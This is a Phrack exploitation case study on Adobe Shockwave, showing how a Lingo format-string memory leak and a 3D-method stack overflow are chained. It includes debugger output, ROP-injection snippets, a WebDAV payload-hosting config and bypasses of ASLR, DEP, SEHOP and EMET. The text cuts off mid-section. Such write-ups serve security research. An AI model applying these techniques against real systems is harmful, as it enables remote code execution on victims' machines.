@@ -1,0 +1,1113 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0f, Issue 0x45, Phile #0x08 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=---------------=[       The Art of Exploitation       ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[  Adobe Shockwave  ]=------------------------=|
+|=----------------=[ A case study on memory disclosure ]=----------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ aaron portnoy ]=--------------------------=|
+|=-------------------=[ deft_phrack at thunkers.net ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Table of contents
+
+ 1 - Introduction
+ 2 - Shockwave Overview
+  2.1 - Deployment Notes
+  2.2 - Supported File Formats
+  2.3 - Creating Director Files
+  2.4 - Relevant Shockwave Modules
+  2.5 - The Lingo Scripting Language
+ 3 - Vulnerability Discovery
+  3.2 - Stack-based Buffer Overflow
+  3.3 - Stack-based Memory Disclosure
+   3.3.1 - Undocumented Format Specifier
+ 4 - Exploit Delivery
+  4.1 - Server-side Architecture
+   4.1.1 - web.py
+   4.1.2 - lighttpd
+  4.2 - The HTML
+  4.3 - The Javascript
+  4.4 - The Lingo
+  4.5 - The Python
+ 5 - Vulnerability Exploitation
+  5.1 - Windows XP SP3 / Firefox / Shockwave 11.6.5.635
+  5.2 - Windows XP SP3 / Firefox / Shockwave 11.6.8.638
+  5.3 - Windows 7 x64  / Firefox / Shockwave 12.0.0.112
+  5.4 - Windows 7 x64  / Firefox / Shockwave 12.0.0.112 / EMET 5.0
+   5.4.1 - Relevant 'EMET 5.0' Mitigations
+  5.5 - Windows 8 x64  / Firefox / Shockwave 12.0.0.112 / EMET 5.0
+   5.5.1 - Relevant 'EMET 5.0 Tech Preview' Mitigations
+ 6 - Future Work
+ 7 - Conclusion
+ 8 - Greets
+ 9 - References
+ 10 - Exploit
+
+
+--[ 1 - Introduction
+
+These days, proper exploit development on the latest and greatest operating
+systems is a time-consuming task. It doesn't help matters that the
+availability of public resources to help individuals research techniques to
+achieve such ends are becoming scarce. There are many reasons why this is
+now the case. Mainly, techniques to bypass security mitigations have become
+a valuable commodity to various entities and as such are no longer released
+as often for public dissemination or to further one's reputation.
+
+I was lucky enough to get started in this field when there were resources
+like Gera's insecure programming challenges [1], 29A [2], Uninformed [3],
+and of course Phrack to inspire me. I've tried to imagine what it would be
+like to be a newcomer in current times and it's a bit depressing that most
+(not all) of the material that is actually published is done so with an
+unhealthy bit of rodomontade and ulterior motives. Generally, the output
+lacks details that are most facilitating to an aspiring researcher--the
+approaches to the problem (including the failures) that so define how a
+so-called hacker really thinks.
+
+This article is intended to give the reader insight into an approach to the
+vulnerability discovery and exploitation process. By no means should the
+take-away from this be that mitigations are broken or easily defeated, but
+rather it serves as a case study demonstrating real-world vulnerabilities
+and the process by which I was able to achieve successful code execution in
+spite of various mitigations that have hitherto not been bypassed publicly.
+
+What follows is walk through of the discovery and exploitation of a memory
+disclosure vulnerability and a stack-based buffer overflow that together
+can be abused to bypass stack cookies (/GS), SafeSEH (/SAFESEH), full
+process Address Space Layout Randomization (ASLR, /DYNAMICBASE), Data
+Execution Prevention (DEP), Structured Exception Handler Overwrite
+Protection (SEHOP), and the Enhanced Mitigation Experience Toolkit (EMET)
+to gain reliable code execution against a multitude of platforms, but with
+a focus on Windows 8 x64.
+
+The bugs discussed herein were discovered by myself and where applicable I
+will try to cite dates to help the reader understand the time invested to
+create the end result. Hopefully there's something in here that you're able
+to take away and I'd like to imagine one day you'll also share something
+with those who come after you.
+
+
+--[ 2 - Shockwave Overview
+
+The vulnerabilities I'll be discussing are in Adobe's Shockwave Player [4],
+a closed-source application used for viewing Adobe Director media files
+within a browser. The player can be installed on Windows and Mac OS
+operating systems and is deployed on over 450 million desktops according to
+Adobe [5].
+
+Shockwave is often confused with Flash due to Flash's misleading MIME type
+of 'application/x-shockwave-flash'. This is not the case, however, and the
+technologies are entirely independent of each other (for the record,
+Shockwave's MIME type is 'application/x-director').
+
+
+----[ 2.1 - Deployment Notes
+
+The Shockwave Player is invoked differently depending on which browser/OS
+you're running. For example, in the case of Internet Explorer the Shockwave
+ActiveX control is instantiated and the Adobe modules are loaded into the
+iexplore.exe process space. However, in the case of Firefox, plugins are
+loaded via NPAPI [6] and occupy a new child process called
+plugin-container.exe.
+
+By default, if a user visits the Shockwave installer site, they are served
+up the "slim" version of the installer. The difference between the slim and
+the full is that the slim does not contain all the functionality for
+various media types (instead they are downloaded when the Player tries to
+render a media file with such content).
+
+It should also be noted that the code is distributed as a 32-bit build,
+even if deployed on a 64-bit operating system.
+
+
+----[ 2.2 - Supported File Formats
+
+Shockwave is used to render Adobe Director files. These come in three
+forms:
+
+	- .dir is an uncompressed Director file
+	- .dcr is Director file compressed in various locations using zlib
+	- .dxr is a non-editable Director file
+
+Each of these are undocumented but are based off of the RIFF file format
+(except that their data is stored in big endian as denoted by the file
+magic value of 'RIFX').
+
+For example, a partial hex dump of a .dir file:
+
+
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+---------------------------------------------------------------------------
+00000000  58 46 49 52 78 62 05 00 33 39 56 4D 70 61 6D 69  XFIRxb..39VMpami
+00000010  18 00 00 00 01 00 00 00 26 8B 00 00 82 07 00 00  ........&`..`...
+00000020  00 00 00 00 00 00 00 00 00 00 00 00 2A 59 45 4B  ............*YEK
+00000030  74 01 00 00 0C 00 0C 00 1E 00 00 00 17 00 00 00  t...............
+00000040  3E 00 00 00 04 00 00 00 6D 75 68 54 0D 00 00 00  >.......muhT....
+00000050  04 00 00 00 44 45 4D 58 2B 00 00 00 4B 00 00 00  ....DEMX+...K...
+00000060  6D 75 68 54 6D 00 00 00 4B 00 00 00 44 45 4D 58  muhTm...K...DEMX
+...
+
+
+The .DCR format is useful for bypassing network detection, as no
+device/software I am aware of currently knows how to decompress this
+proprietary format.
+
+
+----[ 2.3 - Creating Director Files
+
+Director files are created in, appropriately, Adobe Director [7]. The
+interface is very similar to Flash Studio in that there are frames, a movie
+object, a stage, cast members, sprites, and script objects.
+
+One quirk worth mentioning is that by default, when 'playing' a file within
+Director it uses an older version of the Shockwave libraries (not the ones
+in the player's default directory). I'm guessing that this might not be the
+case if you're using the latest Director (version 12), but as I was using
+warez, well, ... you get it. This can impact your exploit development so
+ensure you test outside Director as well (or overwrite the appropriate
+modules with newer versions).
+
+
+----[ 2.4 - Relevant Shockwave Modules
+
+There are two main modules that Shockwave uses to handle parsing and
+rendering of DIR files: DIRAPI.dll and IML32.dll. I did a bit of research
+on these back in 2011 [8]. Shockwave uses a custom memory manager called
+Smartheap [9], but that isn't really of much interest with regard to the
+vulnerabilities described in this article.
+
+In addition to those two modules, there are also a number of "Xtras". These
+files have .x32 extensions but are simply DLL files. They provide added
+functionality for things like embedded media (Quicktime, Flash, 3D objects,
+fonts, audio, and so on).
+
+
+----[ 2.5 - The Lingo Scripting Language
+
+Shockwave files have support for a built-in scripting language called Lingo
+which was created in the 1990s and, according to the inventor John
+Thompson, was his "...most significant contribution to the computer
+industry to date" [10].
+
+Lingo enables a Director developer to interact with multimedia elements and
+the user. Its intended functionality is very similar to its Adobe Flash
+counterpart, Actionscript. Its syntax, however, is a bit different. There
+is an API reference available on Adobe's site [11] that covers mostly
+everything you'd need to know about it.
+
+We'll soon see that Lingo can provide an attacker with a wealth of
+information to aid in the exploitation process.
+
+
+--[ 3 - Vulnerability Discovery
+
+I had previously spent a good amount of time bug hunting in Shockwave for a
+presentation at CanSecWest and had unearthed a few file format
+vulnerabilities. The problem with those, however, is that anybody with the
+ability to bit-flip a file can also stumble upon them trivially. So, this
+time around I decided to see what I could find in Lingo.
+
+One of the most tedious aspects of bug hunting is figuring out the best way
+to generate input to properly cover as much of the attack surface as
+possible. My first attempt at this was to don my hipster jeans and learn to
+develop Director movies legitimately. I tried to embed as much content as
+possible and ensured in a debugger that the appropriate Xtras were being
+loaded into the process. The hardest part was learning how to properly
+access the objects via Lingo and interact with them in the hopes of causing
+a fault.
+
+After exhausting as many Lingo methods as I could manage to invoke (it's a
+long list, check out:
+http://help.adobe.com/en_US/Director/11.5/UsingScripting
+/WSc3ff6d0ea77859461172e0811d64c1a1b3-7ff4.html) I sat back and considered
+what to do next.
+
+Following reflection upon my prior attempts, I realized that the one subset
+of the available Lingo methods that I was unable to invoke were related to
+the 3D API. As it turns out, I was unable to call Lingo's 3D methods
+because I could not embed a proper 3D object and initialize the environment
+as was required.
+
+I decided the best approach was to find an existing Director file that
+already had 3D objects and associated Lingo code in it. After searching a
+while I found that Director itself comes with some tutorial files that fit
+the need. In the
+
+%ProgramFiles%\Adobe\Adobe Director 11\Configuration\Tutorials\3D
+
+folder are the .dir files I was hoping to find. Once they were loaded into
+Director I found the Lingo scripts I could simply modify to invoke the
+methods I had previously overlooked.
+
+
+----[ 3.2 - Stack-based Buffer Overflow
+
+The first vulnerability I discovered was a stack-based buffer overflow that
+could be reached via two different Lingo methods (they hit the same
+vulnerable code, so I consider them the same bug). The vulnerable methods
+were:
+
+    - physicsWorld.loadProxyTemplate(string proxyname, 3dmember)
+    - world.createRigidBody(string rigidbodyname, string 3Dmodelname,
+    symbolBodyProxy, symbol bodyType, symbol flipNormals)
+
+When provided with a large enough string as the first parameter to either
+of these a buffer on the stack can be overflowed.
+
+In order to craft a large string in Lingo, you can use their equivalent of
+a for loop:
+
+
+  buf = ""
+  repeat with i = 0 to 10000
+    buf = buf & "$"
+  end repeat
+
+
+Depending on how much data is provided, the fault that the debugger catches
+may differ. Here's one such crash:
+
+
+(63c.410): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=37734236 ebx=02f6bd10 ecx=00000000 edx=03790404 esi=000033a7
+edi=02f6c248
+eip=6fde9d0a esp=02f6b7ec ebp=02f6b7ec iopl=0       nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00210206
+IML32!Ordinal1115+0xa:
+6fde9d0a 81780454534146  cmp   dword ptr [eax+4],46415354h ds:002b:3773423a
+
+
+OK, from the faulting instruction alone there is not much to deduce. The
+call stack tells us a bit more:
+
+
+0:005> kv
+ChildEBP RetAddr  Args to Child
+02f6b7ec 6f2277b8 37734236 02f6b810 6f2283b1 IML32!Ordinal1115+0xa
+02f6b7f8 6f2283b1 02f6c248 06cf7024 00000000 DIRAPI+0x377b8
+02f6b810 6f23a8ea 06cf7024 000033a7 02f6bd10 DIRAPI+0x383b1
+02f6b82c 6f35ec15 06cf7024 02f6c248 02f6bd10 DIRAPI+0x4a8ea
+02f6b848 6e73250b 06ced4bc 02f6c248 02f6bd10 DIRAPI+0x16ec15
+02f6c114 42346942 69423569 37694236 42386942 Dynamiks+0x335e
+02f6c118 69423569 37694236 42386942 6a423969 0x42346942
+02f6c11c 37694236 42386942 6a423969 316a4230 0x69423569
+02f6c120 42386942 6a423969 316a4230 42326a42 0x37694236
+02f6c124 6a423969 316a4230 42326a42 6a42336a 0x42386942
+02f6c128 316a4230 42326a42 6a42336a 356a4234 0x6a423969
+02f6c12c 42326a42 6a42336a 356a4234 42366a42 0x316a4230
+<snip>
+
+
+The first thing that jumps out here is that there are what appear to be 5
+fully intact frames before the stack is smashed. That tells us that the
+destination buffer likely originates in the Dynamiks module.
+
+We can also see that there are two stack pointers passed as arguments from
+Dynamiks. Inspecting these we can see which was the destination buffer (we
+could also deduce this from the frame pointers we see in the call stack...
+i.e. it's unlikely to be 0x02f6c248 because the corruption began lower on
+the stack):
+
+
+0:005> dc 02f6c248 L8
+02f6c248  73423573 37734236 42387342 74423973 s5Bs6Bs7Bs8Bs9Bt
+02f6c258  31744230 42327442 74423374 35744234 0Bt1Bt2Bt3Bt4Bt5
+0:005> dc 02f6bd10 L8
+02f6bd10  41306141 61413161 33614132 41346141 Aa0Aa1Aa2Aa3Aa4A <- beginning
+02f6bd20  61413561 37614136 41386141 62413961 a5Aa6Aa7Aa8Aa9Ab   of our buf
+
+
+So, the stack buffer begins at 0x02f6bd10 and was passed from the Dynamiks
+module into DIRAPI as argument 3. This can be seen by disassembling the
+Dynamiks module and checking out the code before offset 0x335e:
+
+
+(Dynamiks.x32: md5sum c6a9a75deb3da27682c267a7a2507e16, checksum 2a30eb,
+Shockwave version 12.0.0.112)
+
+0:005> ub Dynamiks+0x335e L6
+Dynamiks+0x334f:
+709e334f 8d8dfcfbffff    lea     ecx,[ebp-404h] <- vulnerable buffer
+709e3355 51              push    ecx <------------ passed as third argument
+709e3356 8d4f08          lea     ecx,[edi+8]
+709e3359 51              push    ecx
+709e335a 50              push    eax
+709e335b ff5244          call    dword ptr [edx+44h]
+
+
+In a real disassembler (IDA Pro) we can see how large that local variable
+is by checking out the function's stack:
+
+
+-00000404 var_404         db 1024 dup(?)  <--- vuln buffer, 1024 bytes
+-00000004 var_4           dd ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008 arg_0           dd ?
++0000000C arg_4           dd ?
++00000010 arg_8           dd ?
++00000014 arg_C           dd ?
++00000018 arg_10          dd ?
+
+
+Any string over 1024 bytes in size will corrupt var_4. Any guess as to what
+var_4 is? Yep... say hello to the /GS mitigation:
+
+
+(Dynamiks.x32: base address 0x10000000)
+
+.text:100018A8                 mov     eax, ___security_cookie
+.text:100018AD                 xor     eax, ebp
+.text:100018AF                 mov     [ebp+var_4], eax
+
+
+For those of you not familiar with /GS [12] it is a compiler option that is
+on by default in any recent version of Visual Studio. It works by ... well,
+skape said it much better than I in his Uninformed [13] article when
+describing stack cookie initialization:
+
+"At a high-level, this routine will take an XOR'd combination of the
+current system time, process identifier, thread identifier, tick count, and
+performance counter. The end result of XOR'ing these values together is
+what ends up being the image file's security cookie."
+
+The result of those operations is a 4-byte value that gets generated when
+the module is loaded and then stored in its .data section. Any function the
+compiler deems in need of some extra protection takes that value and XORs
+it again with the current frame pointer (@ebp). It then stores it on the
+stack as the first local variable. Upon function exit, the process checks
+if it has been tampered with and, if so, throws an exception which usually
+results in process termination.
+
+Had we not caused an exception in IML32.dll the code would still return
+back to the Dynamiks module and upon function exit (provided it doesn't
+access any other invalid data long the way), the stack cookie check would
+fail and the process would throw an exception and probably exit. Either
+way, this is an obstacle we'll need to bypass.
+
+We'll get back to this in a bit.
+
+
+----[ 3.3 - Stack-based Memory Disclosure
+
+In the course of testing the 3D Lingo methods, I was using a string
+consisting of a large amount of the "%x" characters. I was lucky enough to
+also be outputting objects to the Messages window via Lingo's trace()
+function. In a few cases I saw some very interesting output, such as the
+following:
+
+
+ model("d03e682631e7c647ae08432631e18680fb8a9d03e6830680276b012d450d03e686
+ 9080b8e56b7420100c17eb9069056cd56908db3811038")
+
+
+That was certainly not the name I gave that object when I called
+newModel()...
+
+Separating those %x values by spaces yielded:
+
+
+ model("d03e68 6317e44 5ffad60 43 6317dcc 680fb8a9 d03e68 42 680276b0
+ 12d450 d03e68 69080b00 5711164 100c 17eb90 69056cd5 6908db38 1 1038")
+
+
+At this point I was testing all of this on Windows XP and thus there was no
+Address Space Layout Randomization to worry about. With that in mind, I'll
+tell you that DIRAPI.dll has a preferred base address of 0x68000000 and
+IML32.dll of 0x69000000. Looking at the output from the trace() call we can
+clearly see that we're dealing with a format string vulnerability and for
+each %x we provide, we're returned a 32 bit value off the stack.
+
+As the code path to reach this vulnerability is deterministic, it can be
+verified that the code pointers will always be the same on a non-ASLR'd
+system. Thus, we can disclose the base addresses of at least two modules as
+well as what look to be heap and stack pointers. We can verify the
+addresses in a debugger:
+
+
+0:008> !address 0xd03e68
+    00c60000 : 00c60000 - 00101000
+                    Type     00020000 MEM_PRIVATE
+                    Protect  00000004 PAGE_READWRITE
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageHeap
+                    Handle   00150000
+0:008> !heap -p -a 0xd03e68
+    address 00d03e68 found in
+    _HEAP @ 150000
+      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+        00c60018 20000 0000  [0b]   00c60020   100000 - (busy VirtualAlloc)
+          ? <Unloaded_ame.dll>+ffff7
+0:008> !address 6317e44
+    06010000 : 06314000 - 0005b000
+                    Type     00020000 MEM_PRIVATE
+                    Protect  00000004 PAGE_READWRITE
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageHeap
+                    Handle   00150000
+0:008> !address 5ffad60
+    05f00000 : 05f00000 - 00101000
+                    Type     00020000 MEM_PRIVATE
+                    Protect  00000004 PAGE_READWRITE
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageHeap
+                    Handle   00150000
+0:008> !address 12d450
+    00030000 : 0011e000 - 00012000
+                    Type     00020000 MEM_PRIVATE
+                    Protect  00000004 PAGE_READWRITE
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageStack
+                    Pid.Tid  d1c.89c
+0:008> !address 69080b00
+    69000000 : 69001000 - 0008c000
+                    Type     01000000 MEM_IMAGE
+                    Protect  00000020 PAGE_EXECUTE_READ
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageImage
+                    FullPath <snip>IML32.dll
+0:008> ub 69056cd5 L1
+IML32!Ordinal1754+0x12b3:
+69056cd3 ffd5            call    ebp
+
+
+One thing worth pointing out there is that the heap pointers originate from
+an allocation of size 0x100000. This is due to the Smartheap slicing out
+allocations from its own arena of that size.
+
+Anyway, the take-away here is that I was able to leak an address from the
+stack, two from the heap, and one from a module (IML32.dll).
+
+
+------[ 3.3.1 - Undocumented Format Specifier
+
+During my initial attempt at exploitation of these issues, I was having
+trouble locating a reliable stack pivot within the one module I was able to
+leak an address from (IML32.dll). After struggling with that problem for
+about one week, I went back and began reverse engineering the root cause of
+the memory disclosure and came across some undocumented functionality in
+Lingo.
+
+When provided with a "%v" format specifier, the code within DIRAPI.dll
+replaces it with <%d %p>:
+
+
+(DIRAPI.dll: base address 0x68000000,
+md5sum fb5405cef8b2d6273c593477392cbc88, checksum 1c266b,
+Shockwave version 12.0.0.112)
+
+.text:68039FF2  case__v:
+.text:68039FF2
+.text:68039FF2    add     edi, 4          ; jumptable 68039EC7 case 35
+.text:68039FF5    mov     [ebp+var_814], edi
+.text:68039FFB    mov     edi, [edi]
+.text:68039FFD    lea     esi, [ebp+var_810]
+.text:6803A003    mov     byte ptr [ebp+var_404], 0
+.text:6803A00A    call    sub_68039CA0
+.text:6803A00F    test    eax, eax
+.text:6803A011    jz      loc_6803A0EA
+.text:6803A017    mov     eax, [ebp+arg_8]
+.text:6803A01A    mov     ecx, [ebp+var_824]
+.text:6803A020    mov     edx, [ebp+var_828]
+.text:6803A026    push    eax
+.text:6803A027    push    ecx
+.text:6803A028    push    edi
+.text:6803A029    push    edx
+.text:6803A02A    call    sub_68030DB0    ; replaces %v with <%d %p> and
+.text:6803A02A                              re-enters this func
+
+
+By placing %v characters at specific locations in the input string I was
+able to force a dereference of one of the stack values and retrieve two
+32-bit integers from there, which yielded me an additional address within
+a module. Specifically, I was able to leak an address within the
+"Shockwave 3d Asset.x32" module which, it turned out, had a quite useful
+code primitive I abused for a stack pivot.
+
+
+--[ 4 - Exploit Delivery
+
+The exploits discussed herein were progressively developed, with differing
+approaches as obstacles were encountered. I've included explanations of all
+of them to allow the reader to gain some insight into the process rather
+than just delivering an explanation of what came to be the best solution.
+In fact, the attached exploit code has not been "cleaned up", instead it
+contains all the artifacts of a work-in-progress leading up to the final
+solution.
+
+
+----[ 4.1 - Server-side Architecture
+
+As some of the exploits have different required architecture, I will cover
+all the components I utilized throughout the exploitation process.
+
+
+------[ 4.1.1 - web.py
+
+I used web.py[14] to serve the following:
+
+  * HTML pages that embedded the .dir files
+  * Director files
+  * A payload in one of the exploits
+
+The included exploit has the following directory structure:
+
+
+./
+  |   craft_exploit.py
+  |   main.py
+  |
+  |---web
+  |       (web.py library code)
+  |
+  '---www
+      |---dirs
+      |       input.dir
+      |       mem_disc.dir
+      |       output.dir
+      |
+      |---html
+      |       exploit.html
+      |       index.html
+      |
+      '---payload
+              runcalc.dll
+
+
+It is also worth noting that I also added code to handle serving
+gzip-encoded data to my main.py as I encountered some unreliability with
+regard to web.py and its serving of large files.
+
+
+------[ 4.1.2 - lighttpd
+
+During one stage of the exploit development process, the code required a
+WebDAV server to host a payload. For that, I used lighttpd[15] with the
+following configuration:
+
+
+        server.document-root = "/htdocs"
+        server.port = 80
+        server.username = "nobody"
+        server.groupname = "nogroup"
+
+        mimetype.assign = (".html" => "text/html",
+                          ".application" => "application/x-ms-application")
+
+        server.modules   = ( "mod_webdav",
+                             "mod_alias",
+                             "mod_accesslog")
+
+        server.errorlog = "/logs/error.log"
+        accesslog.filename = "/logs/access.log"
+
+        webdav.activate = "enable"
+        webdav.sqlite-db-name = "/lock/lighttpd.webdav_lock.db"
+
+
+
+----[ 4.2 - The HTML
+
+The HTML is pretty basic and consists of an index.html that embeds the .dir
+file responsible for memory disclosure and an iframe that is dynamically
+populated with the exploit.html page, which in turn embeds the crafted .dir
+exploit for that particular client, on demand.
+
+The iframe was required as it was noted that if one was not used, modules
+in memory were loaded and unloaded at potentially different addresses if
+the browser navigated away from one page, thus rendering the memory
+disclosure unreliable.
+
+
+----[ 4.3 - The Javascript
+
+The index.html page contains the javascript functions responsible for the
+following:
+
+  * Receiving disclosed memory contents provided by the mem_disc.dir file
+  * Receiving and parsing version, platform, and user agent information
+  * POST-ing to itself in order to get such data back to main.py
+
+
+----[ 4.4 - The Lingo
+
+There are a couple of Lingo functions and properties that are exceptionally
+friendly for the exploit developer. The following are used to determine how
+to craft the malicious .dir file for a given client and then transport that
+information to the server:
+
+  * goToNetPage - function used to call javascript from the .dir
+  * environmentPropList - property used to obtain platform, operating
+  system information, and shockwave build version
+
+
+----[ 4.5 - The Python
+
+The craft_exploit.py handles construction of a custom .dir file per client
+request. It receives leaked memory addresses, browser user agent, shockwave
+version, and platform information from the aforementioned POST request.
+
+The CraftExploit class defined within contains two class variables of note.
+The self.int_mods list is populated with tuples containing the file offset
+within the template .dir file and the value to inject. For example, the
+first stack pivot used corresponds to offset 0x55AFC in the file. The
+relevant code that replaces that value in the template .dir file looks like
+this:
+
+
+self.int_mods.append((0x55AFC, self.sw_3d+0x13e522))
+
+
+The above will cause the resulting .dir file at offset 0x55AFC to contain a
+pointer to the "Shockwave 3d Asset.x32" at offset 0x13e522.
+
+The other notable class variable is self.str_mods which does much the same
+thing, except that it is implemented as a dictionary. For example, in order
+to ensure that a string value will exist at a given offset in the resulting
+.dir file, one can utilize str_mods as so:
+
+
+self.str_mods[0x536D0] = 'urlmon.dll\x00'
+
+
+The contents of str_mods and int_mods are injected into the file using
+CraftExploit's render method and then served to the target client via the
+web server.
+
+
+--[ 5 - Vulnerability Exploitation
+
+The following sections will walk the reader through my exploit development
+process against various configurations, bypassing mitigations as
+encountered.
+
+
+----[ 5.1 - Windows XP SP3/Firefox/Shockwave 11.6.5.635
+
+This was the first exploit I wrote for this issue, and as I was developing
+it on Windows XP SP3 I did not need to worry about ASLR (or even use the
+memory disclosure vulnerability). This was written the day the bug was
+discovered with the intent of exploiting the issue quickly, not reliably.
+
+As the vulnerable code is protected by /GS, I opted to overwrite one of the
+saved exception handlers on the stack. The executable was also compiled
+with SafeSEH, for which bypasses has been covered extensively by others. In
+short, I pointed the corrupted handler to an address inside a module that
+did not make available the addresses of its exception handling functions
+(for WinDBG users, I recommend checking out the narly[16] plugin that helps
+determine which addresses are available for such a bypass). Thus, the
+exception dispatcher was unable to determine if my corrupted pointer was
+legitimate and would proceed to call it.
+
+I then gained stack control and, after some ROP-ing, VirtualProtectEx'd the
+stack and returned to it, executing a payload that simply ran
+WinExec("calc.exe").
+
+I relied on several things that make this exploit... dirty:
+
+  * The modules I used to ROP with were getting their preferred base
+  addresses, and thus I could easily ignore ASLR.
+  * I used a system library, shell32.dll, for some primitives. This module
+  is updated by Microsoft often and is not something to rely on.
+
+So, to summarize, this exploit bypasses /GS, SafeSEH, DEP, and ignores ASLR
+(but is more of a PoC than a proper exploit--and well, it's XP).
+
+
+----[ 5.2 - Windows XP SP3/Firefox/Shockwave 11.6.8.638
+
+About a day after I wrote the exploit for version 11.6.5.635 Adobe released
+11.6.8.638. For completeness' sake, I added support to my exploit for what
+was the latest version, using identical primitives, differing just in
+location. See the attached exploit for details.
+
+
+----[ 5.3 - Windows 7 x64/Firefox/Shockwave 12.0.0.112
+
+When Adobe released version 12.0.0.112, I decided to utilize the memory
+disclosure bug and exploit the vulnerabilities on a more modern operating
+system, Windows 7.
+
+This time, I used the stack memory disclosure to remove any reliance on
+indeterminable memory addresses, thus bypassing ASLR. Unlike the prior
+exploits, this version simply ROPs to a LoadLibraryA call and requests DLL
+over a UNC path. I created a simple DLL that just calls WinExec("calc.exe")
+upon load. Then, using lighttpd as described in 4.1.2, the file is served.
+
+
+----[ 5.4 - Windows 7 x64/Firefox/Shockwave 12.0.0.112/EMET 5.0
+
+The above exploit against Windows 7 x64 uses LoadLibraryA to load a
+malicious payload off of a UNC share. EMET removes the ability to do this,
+but it is easy enough to bypass, as detailed in the following section.
+
+
+------[ 5.5.1 - Relevant 'EMET 5.0' Mitigations
+
+The exploit for the same target with EMET 5.0 enabled simply calls
+MoveFileA first to move the file from the remote WebDAV to the local
+filesystem and then calls LoadLibraryA on the local file.
+
+Protip: chattr +i the DLL file on the server so that the MoveFileA will
+move it but won't be able to delete it afterwards, enabling subsequent
+exploit attempts to work without a problem. You could also do this within
+the lighttpd config.
+
+Also, EMET implements a mitigation they call Export Address Table
+Filtering[17] which monitors for read accesses to the exported function
+addresses in key system DLL modules. However, the attached exploit
+retrieves the addresses of functions by snagging a pointer via the
+Shockwave modules' import section (which are not monitored by EMET), rather
+than from the system DLL files themselves.
+
+
+----[ 5.5 - Windows 8 x64/Firefox/Shockwave 12.0.0.112/EMET 5.0
+
+Windows 8 introduces a number of exploit mitigations, thoroughly summarized
+by Matt Miller and Ken Johnson during their Blackhat talk in 2012 [18]. The
+most obtrusive mitigation that had to be overcome was SEHOP. SEHOP is
+another mitigation intended to deter exploitation of SEH-based corruption.
+As Microsoft describes [19]:
+
+"The first step involves the insertion of a symbolic exception registration
+record as the tail record in a thread's exception handler list. This step
+occurs when a thread first begins executing in user mode. Since exception
+registration records are always inserted at the head of the exception
+handler list, the symbolic record is guaranteed to be the final exception
+registration record.
+
+The second step consists of walking the exception handler list at the time
+that an exception is being dispatched to ensure that the symbolic record
+can be reached and that it is valid. This step happens when the exception
+dispatcher is notified that an exception has occurred in user mode. If the
+symbolic record cannot be reached, the exception dispatcher can assume that
+the exception handler list is corrupt and that an SEH overwrite may have
+occurred. The exception dispatcher is then able to safely terminate the
+process. If the symbolic record is found, the exception dispatcher is able
+to proceed as it normally would and call each of the registered exception
+handlers."
+
+In order to bypass this mitigation, you pretty much need a memory
+disclosure.  Luckily for me, the leaking of a stack address makes this
+possible.
+
+To demonstrate how such a mitigation is bypassed, the following will walk
+through inspecting the exception chain before and after the exploit
+corrupts it.
+
+Firstly, once attached to the Firefox process, we can tell WinDBG to follow
+child processes with the '.childdbg 1' command. Next we point Firefox to
+the malicious server which will cause the Shockwave player to be invoked,
+thus launching the plugin-container.exe process from Firefox:
+
+
+0:029> .childdbg 1
+Processes created by the current process will be debugged
+0:029> g
+ModLoad: 70b30000 70b63000   C:\Windows\SysWOW64\shdocvw.dll
+<snip>
+ModLoad: 09c70000 09c76000   plugin-container.exe
+Executable search path is:
+ModLoad: 00fa0000 00fa6000   plugin-container.exe
+ModLoad: 772f0000 77447000   ntdll.dll
+ModLoad: 76620000 76750000   C:\Windows\SysWOW64\KERNEL32.DLL
+ModLoad: 74f10000 74fb6000   C:\Windows\SysWOW64\KERNELBASE.dll
+<snip>
+ModLoad: 74980000 74989000   C:\Windows\SysWOW64\CRYPTBASE.dll
+ModLoad: 74920000 74971000   C:\Windows\SysWOW64\bcryptPrimitives.dll
+(834.950): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=00000003 ecx=a1500000 edx=00000000 esi=00000000
+edi=007e0000
+eip=77390545 esp=007bf854 ebp=007bf880 iopl=0       nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00000246
+ntdll!LdrpDoDebuggerBreak+0x2b:
+77390545 cc              int     3
+
+
+In order to inspect the untainted exception chain, we can ask WinDBG to
+next break upon loading of the Dynamiks.x32 module using:
+
+
+1:032> sxe ld:dynamiks
+1:032> g
+(740.1f0): Unknown exception - code 000006ba (first chance)
+ModLoad: 709e0000 70c81000   C:\Users\user\AppData\LocalLow\Adobe\Shockwave
+Player 12\xtras\download\AdobeSystemsIncorporated\Dynamiks\Dynamiks.x32
+eax=00000000 ebx=00800000 ecx=00000000 edx=00000000 esi=00000000
+edi=fe9bf000
+eip=77e20fe8 esp=0061a944 ebp=0061a99c iopl=0       nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00200206
+ntdll!ZwMapViewOfSection+0xc:
+77e20fe8 c22800          ret     28h
+1:032> bp !Dynamiks+0x335b
+1:032> g
+Breakpoint 0 hit
+eax=0506ba80 ebx=00000000 ecx=0061ca6c edx=71407620 esi=050003a0
+edi=0061ca64
+eip=709e335b esp=0061c074 ebp=0061c938 iopl=0       nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00000246
+Dynamiks+0x335b:
+709e335b ff5244        call  dword ptr [edx+44h]  ds:002b:71407664=713debe0
+
+
+We can view the current exception chain with the !exchain command:
+
+
+1:032> !exchain
+0061ef40: USER32!_except_handler4+0 (775f3991)
+0061efa4: USER32!_except_handler4+0 (775f3991)
+0061f000: ntdll!KiUserCallbackExceptionHandler+0 (77e22e60)
